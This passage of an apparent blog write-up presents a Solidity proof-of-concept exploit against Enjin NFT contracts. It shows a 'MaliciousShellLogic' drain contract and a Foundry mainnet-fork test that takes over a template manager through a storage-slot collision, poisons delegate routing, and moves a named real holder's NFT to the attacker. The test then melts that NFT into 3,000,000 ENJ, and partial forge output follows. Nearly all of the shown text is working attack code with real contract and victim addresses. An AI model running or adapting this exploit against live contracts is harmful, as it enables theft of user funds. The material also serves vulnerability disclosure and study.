+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">MaliciousShellLogic</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">PA</span> <span class="o">=</span> <span class="mh">0xfaaFDc07907ff5120a76b34b731b278c38d6043C</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">/// @notice 0x41c1df0e is CryptoItemsAdapters&#39; NFT transfer gateway
+</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">drain</span><span class="p">(</span><span class="kt">address</span> <span class="n">operator</span><span class="p">,</span> <span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">id</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">ok</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">ret</span><span class="p">)</span> <span class="o">=</span> <span class="n">PA</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="mh">0x41c1df0e</span><span class="p">,</span> <span class="n">operator</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">assembly</span> {
+</span></span><span class="line"><span class="cl">                <span class="nf">revert</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">ret</span><span class="p">,</span> <span class="mi">32</span><span class="p">),</span> <span class="nf">mload</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h3 class="heading-element" id="enjinnfthackpoctsol"><span><code>EnjinNftHackPoC.t.sol</code></span>
+  <a href="#enjinnfthackpoctsol" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">23</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Test</span><span class="p">,</span> <span class="n">console2</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">MaliciousShellLogic</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../src/MaliciousShellLogic.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IManagedProxy</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">delegates</span><span class="p">(</span><span class="kt">bytes4</span> <span class="nb">selector</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getManager</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">acceptManager</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IERC20Min</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">EnjinNftHackPoC</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">FORK_BLOCK</span> <span class="o">=</span> <span class="mi">25834070</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">PA</span> <span class="o">=</span> <span class="mh">0xfaaFDc07907ff5120a76b34b731b278c38d6043C</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">ADAPTER</span> <span class="o">=</span> <span class="mh">0x4E643a25a64952895f553f20252861258727174e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">NF_TEMPLATE</span> <span class="o">=</span> <span class="mh">0x13fA4b9a6C2F2604C919f96F456e3b50E968b157</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">ENJ</span> <span class="o">=</span> <span class="mh">0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Real 3,000,000 ENJ target item category and real holder
+</span></span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">BASE_TYPE_ID</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x7880000000000a2f000000000000000000000000000000000000000000000000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">TARGET_INSTANCE_ID</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x7880000000000a2f000000000000000000000000000000000000000000000001</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">VICTIM</span> <span class="o">=</span> <span class="mh">0x50bF217523dC390B18f31bdb1099eBF937dA1756</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">BURN_MARKER</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0xdeaddeaddeaddeaddeaddeaddeaddead0000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes4</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">SEL_INITIALIZE</span> <span class="o">=</span> <span class="mh">0xfe4b84df</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes4</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">SEL_UPDATE_CONTRACT</span> <span class="o">=</span> <span class="mh">0x61455567</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes4</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">SEL_DEPLOY_ADAPTER</span> <span class="o">=</span> <span class="mh">0x33d332ab</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes4</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">SEL_MELT</span> <span class="o">=</span> <span class="mh">0xf6089e12</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envString</span><span class="p">(</span><span class="s">&#34;ETH_RPC_URL&#34;</span><span class="p">),</span> <span class="n">FORK_BLOCK</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">testEnjinNftDrainAndMelt</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">attacker</span> <span class="o">=</span> <span class="n">makeAddr</span><span class="p">(</span><span class="s">&#34;attacker&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Step 1: Storage-slot collision takeover
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">okInit</span><span class="p">,)</span> <span class="o">=</span> <span class="n">NF_TEMPLATE</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">SEL_INITIALIZE</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertTrue</span><span class="p">(</span><span class="n">okInit</span><span class="p">,</span> <span class="s">&#34;initialize failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IManagedProxy</span><span class="p">(</span><span class="n">NF_TEMPLATE</span><span class="p">).</span><span class="n">acceptManager</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertEq</span><span class="p">(</span><span class="n">IManagedProxy</span><span class="p">(</span><span class="n">NF_TEMPLATE</span><span class="p">).</span><span class="n">getManager</span><span class="p">(),</span> <span class="n">attacker</span><span class="p">,</span> <span class="s">&#34;Manager takeover failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Step 2: Route poisoning
+</span></span></span><span class="line"><span class="cl">        <span class="n">MaliciousShellLogic</span> <span class="n">attackerLogic</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MaliciousShellLogic</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes4</span> <span class="n">drainSelector</span> <span class="o">=</span> <span class="n">MaliciousShellLogic</span><span class="p">.</span><span class="n">drain</span><span class="p">.</span><span class="nb">selector</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">okUpdate</span><span class="p">,)</span> <span class="o">=</span> <span class="n">NF_TEMPLATE</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">SEL_UPDATE_CONTRACT</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="kt">address</span><span class="p">(</span><span class="n">attackerLogic</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;drain(address,address,address,uint256);&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;poison&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertTrue</span><span class="p">(</span><span class="n">okUpdate</span><span class="p">,</span> <span class="s">&#34;updateContract failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Step 3: Deploy per-item adapter shell
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">okDeploy</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">retDeploy</span><span class="p">)</span> <span class="o">=</span> <span class="n">PA</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">SEL_DEPLOY_ADAPTER</span><span class="p">,</span> <span class="n">BASE_TYPE_ID</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="kt">uint8</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertTrue</span><span class="p">(</span><span class="n">okDeploy</span><span class="p">,</span> <span class="s">&#34;deploy adapter shell failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">shell</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">decode</span><span class="p">(</span><span class="n">retDeploy</span><span class="p">,</span> <span class="p">(</span><span class="kt">address</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Step 4: Hijack NFT ownership via the shell gateway
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">okDrain</span><span class="p">,)</span> <span class="o">=</span> <span class="n">shell</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">drainSelector</span><span class="p">,</span> <span class="n">attacker</span><span class="p">,</span> <span class="n">VICTIM</span><span class="p">,</span> <span class="n">attacker</span><span class="p">,</span> <span class="n">TARGET_INSTANCE_ID</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertTrue</span><span class="p">(</span><span class="n">okDrain</span><span class="p">,</span> <span class="s">&#34;drain failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Step 5: Melt the stolen NFT into real ENJ
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">attackerEnjBefore</span> <span class="o">=</span> <span class="n">IERC20Min</span><span class="p">(</span><span class="n">ENJ</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">adapterEnjBefore</span> <span class="o">=</span> <span class="n">IERC20Min</span><span class="p">(</span><span class="n">ENJ</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">ADAPTER</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">ids</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">uint256</span><span class="p">[](</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ids</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">TARGET_INSTANCE_ID</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">values</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">uint256</span><span class="p">[](</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">values</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">okMelt</span><span class="p">,)</span> <span class="o">=</span> <span class="n">PA</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">SEL_MELT</span><span class="p">,</span> <span class="n">ids</span><span class="p">,</span> <span class="n">values</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertTrue</span><span class="p">(</span><span class="n">okMelt</span><span class="p">,</span> <span class="s">&#34;melt failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Assertions: 3,000,000 ENJ transferred out of Adapter reserve to attacker
+</span></span></span><span class="line"><span class="cl">        <span class="n">assertEq</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20Min</span><span class="p">(</span><span class="n">ENJ</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">attacker</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">attackerEnjBefore</span> <span class="o">+</span> <span class="mi">3</span><span class="n">_000_000e18</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Attacker did not receive 3M ENJ&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertEq</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20Min</span><span class="p">(</span><span class="n">ENJ</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">ADAPTER</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">adapterEnjBefore</span> <span class="o">-</span> <span class="mi">3</span><span class="n">_000_000e18</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Adapter reserve mismatch&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>Running the test:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-text"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ forge test -vvv
+</span></span><span class="line"><span class="cl">[⠊] Compiling...
+</span></span><span class="line"><span class="cl">No files changed, compilation skipped
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Ran 1 test for test/EnjinNftHackPoC.t.sol:EnjinNftHackPoC
+</span></span><span class="line"><span class="cl">[PASS] testEnjinNftDrainAndMelt() (gas: 727662)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  == STEP 0: preconditions ==
+</span></span><span class="line"><span class="cl">  NF_TEMPLATE pre-manager  :
+</span></span><span class="line"><span class="cl">  0x1952e45D5bD519DC679Cc459C5fD0Ba46305880c
+</span></span><span class="line"><span class="cl">  NF_TEMPLATE pre-pending  :
+</span></span><span class="line"><span class="cl">  0xE5cb0C8E160C5aC4669D1dfD689Df01bA9eea3eB
+</span></span><span class="line"><span class="cl">  BASE_TYPE_ID flag bits: NF / UNBOUND / SKIP_ROYALTY / NO_MELT_FEE (1=set):
+</span></span><span class="line"><span class="cl">  1
+</span></span><span class="line"><span class="cl">  1
+</span></span><span class="line"><span class="cl">  1
+</span></span><span class="line"><span class="cl">  1
+</span></span><span class="line"><span class="cl">  meltValue per instance   :
+</span></span><span class="line"><span class="cl">  3000000000000000000000000
+</span></span><span class="line"><span class="cl">  victim ENJ pre           :
+</span></span><span class="line"><span class="cl">  0
+</span></span><span class="line"><span class="cl">  ADAPTER ENJ pre          :
+</span></span><span class="line"><span class="cl">  9852235680834846022159376
+</span></span><span class="line"><span class="cl">  == STEP 1: takeover NF_TEMPLATE manager ==
+</span></span><span class="line"><span class="cl">  NF_TEMPLATE manager now  :
+</span></span><span class="line"><span class="cl">  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
+</span></span><span class="line"><span class="cl">  == STEP 2: poison delegates table ==
+</span></span><span class="line"><span class="cl">  delegates(drain) now     :
+</span></span><span class="line"><span class="cl">  0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+</span></span><span class="line"><span class="cl">  == STEP 3: deploy per-id shell ==
+</span></span><span class="line"><span class="cl">  deployed shell           :
+</span></span><span class="line"><span class="cl">  0x005ae6aF58f5a14d6D993E91052E17C23AF14a20
+</span></span><span class="line"><span class="cl">  shell impl slot0         :
+</span></span><span class="line"><span class="cl">  0x13fA4b9a6C2F2604C919f96F456e3b50E968b157
+</span></span><span class="line"><span class="cl">  == STEP 4: drain the instance ==
